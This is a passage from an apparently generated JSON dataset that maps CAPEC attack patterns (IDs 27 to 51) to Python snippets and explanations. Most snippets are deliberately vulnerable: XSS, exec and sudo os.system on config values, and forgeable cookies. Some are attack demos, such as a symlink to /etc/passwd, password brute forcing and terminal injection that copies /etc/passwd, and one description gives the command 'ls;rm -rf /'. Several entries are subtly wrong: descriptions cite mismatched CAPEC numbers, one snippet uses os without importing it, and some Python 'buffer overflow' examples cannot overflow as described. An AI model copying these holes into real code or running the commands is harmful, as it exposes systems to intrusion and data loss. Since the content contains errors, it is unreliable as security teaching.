        "description": "This Python code snippet demonstrates a race condition vulnerability. The shared resource is a file named 'shared_file.txt'. The `write_to_file` function writes 'Original content' to the file, waits for a second, and then writes 'Modified content'. The `read_from_file` function waits for half a second and then reads the file's content. Due to the timing, the reader thread may read the file while the writer thread is in the middle of its operation, leading to inconsistent or unexpected results. This example embodies the main idea of CAPEC-367 (Leveraging Race Conditions) and related CWEs such as CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization) and CWE-366 (Race Condition within a Thread)."
    },
    {
        "capec_id": "27",
        "capec_name": "Leveraging Race Conditions via Symbolic Links",
        "code_snippet": "import os\nimport time\nimport tempfile\n\n# Simulate a privileged operation\nprivileged_temp_file = tempfile.NamedTemporaryFile(delete=False)\nprivileged_temp_file_name = privileged_temp_file.name\nprivileged_temp_file.close()\n\n# Attacker creates a symlink to a sensitive file\nsensitive_file = '/etc/passwd'\nos.symlink(sensitive_file, privileged_temp_file_name)\n\n# Simulate a race condition\nif not os.path.exists(privileged_temp_file_name):\n    time.sleep(1)  # Simulate delay\n    with open(privileged_temp_file_name, 'w') as f:\n        f.write('malicious content')\n\n# Clean up\nos.remove(privileged_temp_file_name)",
        "description": "This Python code snippet demonstrates a race condition vulnerability involving symbolic links (symlinks). The privileged operation creates a temporary file, but an attacker can create a symlink to a sensitive file (e.g., '/etc/passwd') with the same name as the temporary file. The race condition occurs between the check (os.path.exists) and the use (open and write) of the temporary file. If the attacker creates the symlink in this interval, the privileged operation will write to the sensitive file instead of the intended temporary file. This embodies the main idea of CAPEC-367 and related CWEs, such as TOCTOU race conditions and improper handling of symlinks."
    },
    {
        "capec_id": "28",
        "capec_name": "Fuzzing",
        "code_snippet": "import random\n\n# Function to simulate processing user input\ndef process_input(user_input):\n    try:\n        # Simulate a command execution with user input\n        command = f\"echo {user_input}\"\n        result = os.popen(command).read()\n        return result\n    except Exception as e:\n        return str(e)\n\n# Fuzzing function to generate random inputs\ndef fuzzing_test():\n    for _ in range(100):  # Simulate 100 fuzzing attempts\n        # Generate random input\n        fuzz_input = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()', k=10))\n        print(f\"Testing with input: {fuzz_input}\")\n        output = process_input(fuzz_input)\n        print(f\"Output: {output}\")\n\nif __name__ == \"__main__\":\n    fuzzing_test()",
        "description": "This Python code snippet demonstrates a basic fuzzing test to identify potential vulnerabilities in a system. The `process_input` function simulates processing user input by constructing and executing a command using the input. The `fuzzing_test` function generates random inputs and tests the `process_input` function with these inputs, printing the results. This approach can help uncover issues related to improper input validation (CWE-20), improper neutralization of special elements (CWE-74), and generation of error messages containing sensitive information (CWE-209). The code embodies the main idea of CAPEC-28 (Fuzzing) by treating the system as a black box and using random inputs to identify weaknesses."
    },
    {
        "capec_id": "29",
        "capec_name": "Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions",
        "code_snippet": "import os\nimport time\nimport threading\n\n# Shared resource\nfile_path = 'example.txt'\n\n# Function to check and use the file\ndef check_and_use_file():\n    # Time of check\n    if os.path.exists(file_path):\n        print('File exists, proceeding to use it...')\n        # Simulate a delay\n        time.sleep(1)\n        # Time of use\n        with open(file_path, 'r') as file:\n            data = file.read()\n            print('File content:', data)\n    else:\n        print('File does not exist.')\n\n# Function to simulate an attacker modifying the file\ndef attacker_modify_file():\n    # Wait for a moment to ensure the race condition\n    time.sleep(0.5)\n    with open(file_path, 'w') as file:\n        file.write('Malicious content')\n    print('Attacker modified the file.')\n\n# Create the file initially\nwith open(file_path, 'w') as file:\n    file.write('Original content')\n\n# Create threads for the victim and attacker\nvictim_thread = threading.Thread(target=check_and_use_file)\nattacker_thread = threading.Thread(target=attacker_modify_file)\n\n# Start the threads\nvictim_thread.start()\nattacker_thread.start()\n\n# Wait for both threads to complete\nvictim_thread.join()\nattacker_thread.join()",
        "description": "This Python code snippet demonstrates a Time-of-Check to Time-of-Use (TOCTOU) race condition. The `check_and_use_file` function checks if a file exists and then reads its content after a delay. Meanwhile, the `attacker_modify_file` function modifies the file content during the delay, creating a race condition. This example embodies the main idea of CAPEC-367 by showing how an attacker can exploit the time window between the check and use of a resource. The use of threading simulates concurrent execution, highlighting the potential for race conditions as described in related CWEs."
    },
    {
        "capec_id": "30",
        "capec_name": "Hijacking a Privileged Thread of Execution",
        "code_snippet": "import ctypes\nimport os\nimport time\nimport threading\n\n# Vulnerable function that simulates a privileged thread\nclass PrivilegedThread(threading.Thread):\n    def run(self):\n        while True:\n            print(\"Privileged operation\")\n            time.sleep(1)\n\n# Function to hijack the privileged thread\ndef hijack_thread(thread_id):\n    # Suspend the thread\n    ctypes.windll.kernel32.SuspendThread(thread_id)\n\n    # Inject malicious code (simulated by changing the thread's context)\n    # This is a simplified example and does not represent actual code injection\n    print(\"Thread hijacked!\")\n\n    # Resume the thread\n    ctypes.windll.kernel32.ResumeThread(thread_id)\n\n# Start the privileged thread\npriv_thread = PrivilegedThread()\npriv_thread.start()\n\n# Give the thread some time to start\ntime.sleep(2)\n\n# Hijack the privileged thread\nhijack_thread(priv_thread.ident)\n\n# Keep the main thread alive\nwhile True:\n    time.sleep(1)",
        "description": "This Python code snippet demonstrates a simplified version of hijacking a privileged thread of execution. The `PrivilegedThread` class simulates a thread performing privileged operations. The `hijack_thread` function suspends the thread, simulates injecting malicious code by printing a message, and then resumes the thread. This example embodies the main idea of CAPEC-152: Hijacking a Privileged Thread of Execution. The code also touches on related CWEs, such as CWE-270 (Privilege Context Switching Error) by improperly managing thread suspension and resumption, and CWE-362 (Race Condition) by creating a timing window where the thread's state can be manipulated."
    },
    {
        "capec_id": "31",
        "capec_name": "Accessing/Intercepting/Modifying HTTP Cookies",
        "code_snippet": "from flask import Flask, request, make_response\nimport hashlib\n\napp = Flask(__name__)\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    # Simulate user authentication\n    if username == 'admin' and password == 'password':\n        # Create a cookie with sensitive information\n        session_id = hashlib.sha256(f'{username}{password}'.encode()).hexdigest()\n        resp = make_response('Logged in successfully')\n        resp.set_cookie('session_id', session_id)\n        return resp\n    return 'Invalid credentials', 401\n\n@app.route('/dashboard')\ndef dashboard():\n    session_id = request.cookies.get('session_id')\n    if session_id == hashlib.sha256('adminpassword'.encode()).hexdigest():\n        return 'Welcome to the admin dashboard'\n    return 'Access denied', 403\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application that is vulnerable to several issues related to the CAPEC 'Accessing/Intercepting/Modifying HTTP Cookies'. The application has a login route that sets a session cookie with sensitive information (session ID) in cleartext, which is derived from the username and password. The dashboard route checks this session cookie to grant access. This code is vulnerable to several CWEs: \n1. CWE-315: Cleartext Storage of Sensitive Information in a Cookie - The session ID is stored in cleartext.\n2. CWE-565: Reliance on Cookies without Validation and Integrity Checking - The session ID is not validated for integrity.\n3. CWE-311: Missing Encryption of Sensitive Data - The session ID is not encrypted.\n4. CWE-539: Use of Persistent Cookies Containing Sensitive Information - The session ID is stored in a persistent cookie.\n5. CWE-384: Session Fixation - The session ID is not invalidated upon login.\n6. CWE-642: External Control of Critical State Data - The session ID is stored in a client-accessible cookie.\nThis code represents the main idea of the CAPEC by showing how sensitive information in cookies can be accessed, intercepted, or modified by an attacker."
    },
    {
        "capec_id": "32",
        "capec_name": "XSS Through HTTP Query Strings",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    query = request.args.get('query')\n    # Vulnerable to XSS\n    return render_template_string('<h1>Search Results for: {}</h1>'.format(query))\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a basic Flask web application that is vulnerable to Cross-Site Scripting (XSS) through HTTP query strings. The application has a single route '/search' that takes a 'query' parameter from the URL. The value of this parameter is directly inserted into the HTML response without any validation or sanitization, making it susceptible to XSS attacks. An attacker could craft a URL with a malicious script in the 'query' parameter, which would then be executed in the victim's browser when they visit the URL. This example embodies the main idea of the CAPEC by showing how improper neutralization of input (CWE-79, CWE-80) and improper encoding or escaping of output (CWE-116) can lead to XSS vulnerabilities."
    },
    {
        "capec_id": "33",
        "capec_name": "HTTP Request Smuggling",
        "code_snippet": "import socket\n\n# Simulate a vulnerable HTTP proxy\nclass VulnerableProxy:\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n\n    def start(self):\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.bind((self.host, self.port))\n            s.listen(5)\n            while True:\n                client_socket, addr = s.accept()\n                with client_socket:\n                    request = client_socket.recv(1024).decode('utf-8')\n                    if request:\n                        self.handle_request(client_socket, request)\n\n    def handle_request(self, client_socket, request):\n        # Forward the request to the backend server\n        backend_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        backend_socket.connect(('backend.server', 80))\n        backend_socket.sendall(request.encode('utf-8'))\n\n        # Receive the response from the backend server\n        response = backend_socket.recv(4096)\n        backend_socket.close()\n\n        # Send the response back to the client\n        client_socket.sendall(response)\n\nif __name__ == '__main__':\n    proxy = VulnerableProxy('0.0.0.0', 8080)\n    proxy.start()",
        "description": "This Python code snippet demonstrates a simple HTTP proxy that is vulnerable to HTTP Request Smuggling attacks. The proxy listens for incoming HTTP requests and forwards them to a backend server without properly validating or sanitizing the requests. This can lead to various attacks, such as HTTP Request Smuggling, where an attacker can craft malicious HTTP requests that are interpreted differently by the proxy and the backend server. The code also touches on related CWEs, such as improper neutralization of CRLF sequences (CWE-113) and inconsistent interpretation of HTTP requests (CWE-444)."
    },
    {
        "capec_id": "34",
        "capec_name": "HTTP Response Splitting",
        "code_snippet": "from http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass VulnerableHTTPRequestHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        user_input = self.headers.get('User-Input')\n        if user_input:\n            # Vulnerable to HTTP Response Splitting\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.send_header('Set-Cookie', f'sessionid=12345; {user_input}')\n            self.end_headers()\n            self.wfile.write(b'Hello, world!')\n        else:\n            self.send_response(400)\n            self.end_headers()\n\nif __name__ == '__main__':\n    server = HTTPServer(('localhost', 8080), VulnerableHTTPRequestHandler)\n    print('Starting server at http://localhost:8080')\n    server.serve_forever()",
        "description": "This Python code snippet demonstrates a simple HTTP server that is vulnerable to HTTP Response Splitting. The server reads a 'User-Input' header from the incoming HTTP request and directly includes it in the 'Set-Cookie' header of the HTTP response without proper sanitization. This can allow an attacker to inject CRLF sequences into the 'User-Input' header, leading to the injection of additional HTTP headers or even entire HTTP responses. This vulnerability is related to CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers) and CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component)."
    },
    {
        "capec_id": "35",
        "capec_name": "Leverage Executable Code in Non-Executable Files",
        "code_snippet": "import os\nimport configparser\n\n# CWE-94: Code Injection\n# CWE-96: Static Code Injection\n# CWE-95: Eval Injection\n# CWE-272: Least Privilege Violation\n# CWE-59: Link Following\n# CWE-282: Improper Ownership Management\n# CWE-270: Privilege Context Switching Error\n\ndef load_config(file_path):\n    config = configparser.ConfigParser()\n    config.read(file_path)\n    return config\n\n# Simulate loading a configuration file\nconfig_file = 'config.ini'\nconfig = load_config(config_file)\n\n# CWE-94: Code Injection vulnerability\n# Assume the config file contains a key 'command' with a malicious payload\ncommand = config['DEFAULT']['command']\n\n# CWE-95: Eval Injection vulnerability\n# Directly evaluating the command from the config file\nexec(command)\n\n# CWE-272: Least Privilege Violation\n# Running the command with elevated privileges\nos.system('sudo ' + command)\n\n# CWE-59: Link Following\n# Improperly resolving symbolic links\nif os.path.islink(config_file):\n    real_path = os.readlink(config_file)\n    print(f'Resolved link: {real_path}')\n\n# CWE-282: Improper Ownership Management\n# Changing ownership of a file without proper checks\nos.chown(config_file, 1000, 1000)\n\n# CWE-270: Privilege Context Switching Error\n# Switching context without proper management\nos.setuid(0)\nexec(command)\n",
        "description": "This Python code snippet demonstrates a variety of vulnerabilities related to the CAPEC 'Leverage Executable Code in Non-Executable Files'. The code reads a configuration file and executes commands specified within it, which can be exploited by an attacker to inject malicious code. The code also demonstrates improper handling of symbolic links, ownership management, and privilege context switching, which can further be exploited to escalate privileges or execute unintended actions. The vulnerabilities highlighted include CWE-94 (Code Injection), CWE-96 (Static Code Injection), CWE-95 (Eval Injection), CWE-272 (Least Privilege Violation), CWE-59 (Link Following), CWE-282 (Improper Ownership Management), and CWE-270 (Privilege Context Switching Error)."
    },
    {
        "capec_id": "36",
        "capec_name": "Using Unpublished Interfaces or Functionality",
        "code_snippet": "class SensitiveOperations:\n    def __init__(self):\n        self._secret_data = \"Sensitive Information\"\n\n    def _hidden_function(self):\n        return self._secret_data\n\n    def public_function(self):\n        return \"Public Information\"\n\n# Simulating an attacker discovering and invoking the hidden function\nsensitive_ops = SensitiveOperations()\nprint(sensitive_ops._hidden_function())  # Accessing unpublished interface",
        "description": "This Python code snippet demonstrates a class `SensitiveOperations` that contains both a public method `public_function` and a hidden method `_hidden_function`. The hidden method `_hidden_function` is intended to be private and returns sensitive information. However, it is not properly protected and can be accessed directly. This represents the CAPEC 'Using Unpublished Interfaces or Functionality' where an attacker discovers and invokes functionality that was not meant to be publicly accessible. The related CWEs are illustrated by the lack of authentication (CWE-306), missing authorization (CWE-862), and the use of low-level functionality (CWE-695) that exposes sensitive data."
    },
    {
        "capec_id": "37",
        "capec_name": "Retrieve Embedded Sensitive Data",
        "code_snippet": "import os\n\n# CWE-312: Cleartext Storage of Sensitive Information\n# CWE-314: Cleartext Storage in the Registry\n# CWE-315: Cleartext Storage of Sensitive Information in a Cookie\n# CWE-318: Cleartext Storage of Sensitive Information in Executable\n\n# Sensitive data stored in cleartext\nsensitive_data = 'password123'\n\n# Store sensitive data in a file (cleartext storage)\nwith open('sensitive_data.txt', 'w') as file:\n    file.write(sensitive_data)\n\n# Store sensitive data in an environment variable (cleartext storage)\nos.environ['SENSITIVE_DATA'] = sensitive_data\n\n# Store sensitive data in a cookie (cleartext storage)\ncookie = f\"Set-Cookie: sensitive_data={sensitive_data}; HttpOnly\"\n\n# Store sensitive data in an executable (cleartext storage)\ndef get_sensitive_data():\n    return sensitive_data\n\n# Example of improper zeroization (CWE-226)\ndef clear_sensitive_data():\n    global sensitive_data\n    sensitive_data = None  # This does not zeroize the data\n\n# Call the function to clear sensitive data\nclear_sensitive_data()",
        "description": "This Python code snippet demonstrates the main idea of CAPEC- Retrieve Embedded Sensitive Data by showing how sensitive information can be improperly stored and managed. The code includes examples of storing sensitive data in cleartext within a file, an environment variable, a cookie, and an executable, which are related to CWEs 312, 314, 315, and 318. Additionally, it shows an example of improper zeroization (CWE-226) where sensitive data is set to None but not properly cleared from memory. This code highlights the risks of embedding sensitive data within a system and the potential for attackers to retrieve it."
    },
    {
        "capec_id": "38",
        "capec_name": "Leveraging/Manipulating Configuration File Search Paths",
        "code_snippet": "import os\nimport sys\n\n# CWE-426: Untrusted Search Path\n# CWE-427: Uncontrolled Search Path Element\n# CWE-73: External Control of File Name or Path\n# CWE-99: Improper Control of Resource Identifiers\n\n# Simulate an attacker-controlled environment variable\nos.environ['PATH'] = '/malicious/path:' + os.environ['PATH']\n\n# Function that executes a system command\n# Vulnerable to path manipulation\n# CWE-426, CWE-427, CWE-73, CWE-99\n\ndef execute_command(command):\n    os.system(command)\n\n# Example usage\n# This will execute the malicious 'ls' if it exists in /malicious/path\nexecute_command('ls')",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can manipulate the search path used by the program to execute commands. The code sets the PATH environment variable to include a malicious directory at the beginning. When the 'execute_command' function is called with a command like 'ls', the system will search the PATH directories in order and execute the first matching executable it finds. If a malicious 'ls' executable is placed in '/malicious/path', it will be executed instead of the legitimate system 'ls' command. This embodies the CAPEC concept of leveraging/manipulating configuration file search paths and highlights related CWEs such as untrusted search paths, uncontrolled search path elements, and external control of file names or paths."
    },
    {
        "capec_id": "39",
        "capec_name": "Manipulating Opaque Client-based Data Tokens",
        "code_snippet": "from flask import Flask, request, make_response\nimport base64\n\napp = Flask(__name__)\n\n@app.route('/set_token')\ndef set_token():\n    user_id = request.args.get('user_id')\n    token = base64.b64encode(f'user_id={user_id}'.encode()).decode()\n    resp = make_response('Token set in cookie')\n    resp.set_cookie('auth_token', token)\n    return resp\n\n@app.route('/get_data')\ndef get_data():\n    token = request.cookies.get('auth_token')\n    if not token:\n        return 'No token found', 401\n    decoded_token = base64.b64decode(token).decode()\n    user_id = decoded_token.split('=')[1]\n    # No integrity check or validation of the token\n    return f'Access granted for user {user_id}'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that sets and retrieves an authentication token stored in a cookie. The token is base64 encoded but lacks integrity checks and validation, making it vulnerable to manipulation. An attacker could modify the token to gain unauthorized access. This example embodies the CAPEC of 'Manipulating Opaque Client-based Data Tokens' and highlights related CWEs such as 'Missing Support for Integrity Check' (CWE-353), 'Improper Authorization' (CWE-285), and 'Reliance on Cookies without Validation and Integrity Checking' (CWE-565)."
    },
    {
        "capec_id": "40",
        "capec_name": "Manipulating Writeable Terminal Devices",
        "code_snippet": "import os\nimport sys\n\n# Simulate an attacker writing to a terminal device\nattacker_input = \"\\ncat /etc/passwd > /tmp/stolen_passwd\\n\"\n\n# Vulnerable terminal device file (e.g., /dev/pts/1)\nterminal_device = \"/dev/pts/1\"\n\ntry:\n    with open(terminal_device, 'w') as terminal:\n        terminal.write(attacker_input)\nexcept Exception as e:\n    print(f\"Error writing to terminal device: {e}\")",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can write malicious commands to a terminal device that is writable by other users. The attacker sends a command to copy the contents of /etc/passwd to a temporary file, which can then be accessed by the attacker. This embodies the CAPEC 'Manipulating Writeable Terminal Devices' and highlights related CWEs such as command injection (CWE-77, CWE-78) and exposure of sensitive information (CWE-214). The code shows how an attacker can exploit a writable terminal device to execute commands with the privileges of the target user."
    },
    {
        "capec_id": "41",
        "capec_name": "Using Meta-characters in E-mail Headers to Inject Malicious Payloads",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\n\n# Vulnerable function to send an email\ndef send_email(to_address, subject, body):\n    from_address = 'attacker@example.com'\n    # Construct email headers with potential meta-characters\n    headers = f\"From: {from_address}\\nTo: {to_address}\\nSubject: {subject}\\n\"\n    # Improper neutralization of meta-characters in headers\n    msg = MIMEText(body)\n    msg.set_payload(headers + body)\n\n    # Send the email\n    with smtplib.SMTP('localhost') as server:\n        server.sendmail(from_address, to_address, msg.as_string())\n\n# Example usage\nsend_email('victim@example.com', 'Hello', 'This is a test email.')",
        "description": "This Python code snippet demonstrates a vulnerable email-sending function that improperly handles meta-characters in email headers. The function `send_email` constructs email headers using string interpolation, which can be exploited by an attacker to inject malicious payloads. The headers are concatenated with the email body without proper neutralization or escaping of special characters, making it susceptible to injection attacks. This example embodies the CAPEC concept of using meta-characters in email headers to inject malicious payloads, and it highlights related CWEs such as improper neutralization of escape sequences (CWE-150) and improper encoding or escaping of output (CWE-116)."
    },
    {
        "capec_id": "42",
        "capec_name": "MIME Conversion",
        "code_snippet": "import email\nfrom email import policy\nfrom email.parser import BytesParser\n\n# Simulate receiving an email with MIME content\nraw_email = b\"\"\"MIME-Version: 1.0\nContent-Type: text/plain; charset=utf-8\n\nHello, this is a test email with a very long content that will cause a buffer overflow. \"\"\" + b\"A\" * 1000\n\n# Parse the email\nmsg = BytesParser(policy=policy.default).parsebytes(raw_email)\n\n# Vulnerable function: improper handling of MIME conversion\ndef vulnerable_mime_conversion(msg):\n    # Extract payload\n    payload = msg.get_payload(decode=True)\n    # Vulnerable buffer copy without checking size\n    buffer = bytearray(512)  # Fixed size buffer\n    for i in range(len(payload)):\n        buffer[i] = payload[i]  # No bounds checking\n    return buffer\n\n# Call the vulnerable function\nvulnerable_mime_conversion(msg)",
        "description": "This Python code snippet demonstrates a vulnerable MIME conversion routine that can lead to a buffer overflow. The code simulates receiving an email with MIME content and then parses it. The `vulnerable_mime_conversion` function extracts the payload from the email and copies it into a fixed-size buffer without checking the size of the input. This can cause a buffer overflow if the payload is larger than the buffer, potentially allowing an attacker to gain control over the system. This example embodies the main idea of the CAPEC by exploiting weaknesses in MIME conversion routines, specifically highlighting CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "43",
        "capec_name": "Exploiting Multiple Input Interpretation Layers",
        "code_snippet": "import os\n\n# First parser layer\nuser_input = input(\"Enter your command: \")\nparsed_input = user_input.replace(\"\\\\\", \"\")  # Remove escape characters\n\n# Input validation layer\nif any(char in parsed_input for char in [';', '&', '|']):\n    raise ValueError(\"Invalid input detected!\")\n\n# Second parser layer\nfinal_command = parsed_input.replace(\"\\n\", \"\")  # Remove newlines\n\n# Execution of the command\nos.system(final_command)",
        "description": "This Python code snippet demonstrates the concept of 'Exploiting Multiple Input Interpretation Layers' (CAPEC-173). The code takes user input and processes it through multiple layers: an initial parser that removes escape characters, an input validation layer that checks for dangerous characters, and a final parser that removes newlines before executing the command. The vulnerability arises because the input validation occurs before the final parsing, allowing an attacker to bypass the validation by using escape characters that are removed in the first parsing layer. For example, an attacker could input 'ls\\;rm -rf /' which would pass the validation but be transformed into 'ls;rm -rf /' by the final parser, leading to command injection (CWE-77, CWE-78)."
    },
    {
        "capec_id": "44",
        "capec_name": "Overflow Binary Resource File",
        "code_snippet": "import struct\n\ndef process_binary_file(file_path):\n    try:\n        with open(file_path, 'rb') as f:\n            data = f.read()\n            # Assume the first 4 bytes represent the size of the payload\n            payload_size = struct.unpack('<I', data[:4])[0]\n            # Vulnerable buffer allocation without size check\n            buffer = bytearray(256)\n            for i in range(payload_size):\n                buffer[i] = data[4 + i]\n            print('File processed successfully')\n    except Exception as e:\n        print(f'Error processing file: {e}')\n\n# Example usage\nprocess_binary_file('example.bin')",
        "description": "This Python code snippet demonstrates a vulnerable function that processes a binary file. The function `process_binary_file` reads the entire content of a binary file and assumes the first 4 bytes represent the size of the payload. It then allocates a fixed-size buffer of 256 bytes and copies the payload into this buffer without checking if the payload size exceeds the buffer size. This can lead to a buffer overflow vulnerability (CWE-120, CWE-119), allowing an attacker to execute arbitrary code by crafting a malicious binary file. The code embodies the main idea of the CAPEC by showing how a buffer overflow in handling binary resources can be exploited."
    },
    {
        "capec_id": "45",
        "capec_name": "Buffer Overflow via Symbolic Links",
        "code_snippet": "import os\nimport sys\n\n# Function to read a symbolic link and copy its content to a buffer\n# This function is vulnerable to buffer overflow\n\ndef read_symlink_and_copy(link_path):\n    try:\n        # Read the symbolic link\n        target_path = os.readlink(link_path)\n        \n        # Open the target file\n        with open(target_path, 'r') as file:\n            data = file.read()\n            \n            # Vulnerable buffer copy without checking size\n            buffer = 'A' * 256  # Fixed size buffer\n            buffer = data  # Potential buffer overflow if data is larger than buffer\n            \n            print(\"Data copied to buffer:\", buffer)\n    except Exception as e:\n        print(\"Error:\", e)\n\n# Example usage\nif __name__ == \"__main__\":\n    if len(sys.argv) != 2:\n        print(\"Usage: python script.py <symlink_path>\")\n        sys.exit(1)\n    read_symlink_and_copy(sys.argv[1])",
        "description": "This Python code snippet demonstrates a vulnerable function that reads a symbolic link and copies its content to a buffer without proper size checking, leading to a potential buffer overflow. The function `read_symlink_and_copy` reads the target path of a symbolic link, opens the target file, and reads its content. It then copies the content to a fixed-size buffer without verifying the size of the input data, which can cause a buffer overflow if the data exceeds the buffer size. This code embodies the main idea of the CAPEC 'Buffer Overflow via Symbolic Links' and incorporates related CWEs such as CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "46",
        "capec_name": "Overflow Variables and Tags",
        "code_snippet": "import cgi\n\n# Simulate a configuration file with oversized strings\nconfig_data = '<config><tag>' + 'A' * 10000 + '</tag></config>'\n\n# Vulnerable function to parse configuration data\ndef parse_config(data):\n    buffer = [''] * 256  # Fixed-size buffer\n    tag_start = data.find('<tag>') + len('<tag>')\n    tag_end = data.find('</tag>')\n    if tag_start == -1 or tag_end == -1:\n        return 'Invalid config'\n    tag_content = data[tag_start:tag_end]\n    for i in range(len(tag_content)):\n        buffer[i] = tag_content[i]  # No bounds checking\n    return ''.join(buffer)\n\n# Simulate receiving and parsing the configuration data\nparsed_data = parse_config(config_data)\nprint(parsed_data)",
        "description": "This Python code snippet demonstrates a vulnerable function that parses configuration data containing tags. The `config_data` variable simulates a configuration file with an oversized string within a tag. The `parse_config` function attempts to extract the content of the tag and copy it into a fixed-size buffer without performing bounds checking, leading to a potential buffer overflow. This example embodies the main idea of the CAPEC 'Overflow Variables and Tags' and incorporates related CWEs such as CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "47",
        "capec_name": "Buffer Overflow via Parameter Expansion",
        "code_snippet": "import os\n\ndef vulnerable_function(user_input):\n    # CWE-20: Improper Input Validation\n    if not isinstance(user_input, str):\n        raise ValueError('Input must be a string')\n\n    # CWE-131: Incorrect Calculation of Buffer Size\n    buffer_size = len(user_input) * 2\n    buffer = [''] * buffer_size\n\n    # CWE-120: Buffer Copy without Checking Size of Input\n    for i in range(len(user_input)):\n        buffer[i] = user_input[i]\n\n    # CWE-74: Improper Neutralization of Special Elements\n    expanded_input = os.path.expandvars(''.join(buffer))\n\n    # CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n    for i in range(len(expanded_input)):\n        buffer[i] = expanded_input[i]\n\n    return ''.join(buffer)\n\n# Example usage\nuser_input = 'A' * 50\nprint(vulnerable_function(user_input))",
        "description": "This Python code snippet demonstrates a vulnerable function that processes user input, potentially leading to a buffer overflow via parameter expansion. The function first checks if the input is a string (CWE-20: Improper Input Validation). It then incorrectly calculates the buffer size (CWE-131: Incorrect Calculation of Buffer Size) by doubling the length of the input string. The input is copied into the buffer without checking if the buffer can hold the expanded input (CWE-120: Buffer Copy without Checking Size of Input). The input is then expanded using `os.path.expandvars`, which can increase its size. Finally, the expanded input is copied back into the buffer without proper bounds checking (CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer). This code represents the main idea of the CAPEC by showing how improper handling of input and buffer sizes can lead to a buffer overflow."
    },
    {
        "capec_id": "48",
        "capec_name": "Passing Local Filenames to Functions That Expect a URL",
        "code_snippet": "import requests\n\n# Function that expects a URL but can be tricked into accepting a local file path\ndef fetch_data(resource):\n    try:\n        # Check if the resource is a URL\n        if resource.startswith('http://') or resource.startswith('https://'):\n            response = requests.get(resource)\n        else:\n            # Read local file content\n            with open(resource, 'r') as file:\n                response = file.read()\n        return response\n    except Exception as e:\n        return str(e)\n\n# Example usage\nresource = 'file:///etc/passwd'  # An attacker-controlled input\nresult = fetch_data(resource)\nprint(result)",
        "description": "This Python code snippet demonstrates a vulnerability where a function `fetch_data` expects a URL but can be tricked into accepting a local file path. The function checks if the input starts with 'http://' or 'https://', and if not, it treats the input as a local file path and reads the file content. This can lead to unauthorized access to local files and potential data exfiltration. The code embodies the main idea of CAPEC- passing local filenames to functions that expect a URL, and it also touches on related CWEs such as improper handling of unexpected data types (CWE-241) and reliance on file name or extension (CWE-646)."
    },
    {
        "capec_id": "49",
        "capec_name": "Password Brute Forcing",
        "code_snippet": "import itertools\nimport string\n\n# Weak password requirements (CWE-521)\npassword_length = 4\nalphabet = string.ascii_lowercase\n\n# Simulate a stored password (CWE-257)\nstored_password = 'pass'\n\n# Brute force attack\nfor attempt in itertools.product(alphabet, repeat=password_length):\n    attempt_password = ''.join(attempt)\n    print(f'Trying password: {attempt_password}')\n    if attempt_password == stored_password:\n        print('Password found:', attempt_password)\n        break\n\n# No restriction on excessive authentication attempts (CWE-307)\n# Single-factor authentication (CWE-308)\n# Reliance on a single factor (CWE-654)\n# No password aging (CWE-262)\n# Long expiration period (CWE-263)\n",
        "description": "This Python code snippet demonstrates a brute force attack on a weak password system. The code uses itertools to generate all possible combinations of lowercase letters for a password of length 4, representing weak password requirements (CWE-521). It then compares each generated password with a stored password ('pass'), which is stored in plaintext (CWE-257). The code does not implement any restrictions on the number of authentication attempts (CWE-307), relies on single-factor authentication (CWE-308), and does not consider password aging (CWE-262, CWE-263). This example highlights the vulnerabilities associated with weak password policies and the ease with which a brute force attack can succeed."
    },
    {
        "capec_id": "50",
        "capec_name": "Password Recovery Exploitation",
        "code_snippet": "import hashlib\n\n# Weak password recovery mechanism\nusers = {\n    'user1': {'password': '5f4dcc3b5aa765d61d8327deb882cf99', 'security_answer': 'petname'},  # 'password' hashed with MD5\n}\n\n# Function to recover password\ndef recover_password(username, security_answer):\n    if username in users and users[username]['security_answer'] == security_answer:\n        return users[username]['password']  # Returning hashed password directly\n    return 'Invalid username or security answer'\n\n# Example usage\nusername = 'user1'\nsecurity_answer = 'petname'\nrecovered_password = recover_password(username, security_answer)\nprint(f'Recovered password hash for {username}: {recovered_password}')\n",
        "description": "This Python code snippet demonstrates a weak password recovery mechanism, embodying the main idea of CAPEC-139: Password Recovery Exploitation. The code stores user passwords in a recoverable format (MD5 hash) and uses a simple security question for password recovery. If an attacker knows or guesses the security answer, they can retrieve the hashed password, which is susceptible to further attacks (e.g., dictionary attacks). This example highlights several related CWEs: CWE-640 (Weak Password Recovery Mechanism), CWE-257 (Storing Passwords in a Recoverable Format), and CWE-522 (Insufficiently Protected Credentials)."
    },
    {
        "capec_id": "51",
        "capec_name": "Poison Web Service Registry",
